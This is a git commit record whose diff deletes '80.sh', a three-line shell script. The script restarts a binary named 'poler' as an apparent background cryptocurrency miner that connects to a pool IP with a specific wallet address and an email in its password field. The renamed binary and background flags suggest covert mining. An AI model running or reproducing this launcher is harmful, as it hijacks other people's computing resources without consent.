85544101e65b980175002a7080256b81bd2a6a91
burkabest <52100051+burkabest@users.noreply.github.com>
2019-08-05 16:41:22 -0400

    Delete 80.sh

--- 80.sh
+++
@@ -1,3 +0,0 @@
-pkill poler
-sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 82 --cpu-priority 8 -o 185.231.154.149:5912 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=myfirstss2:robbertopp1@gmail.com -k
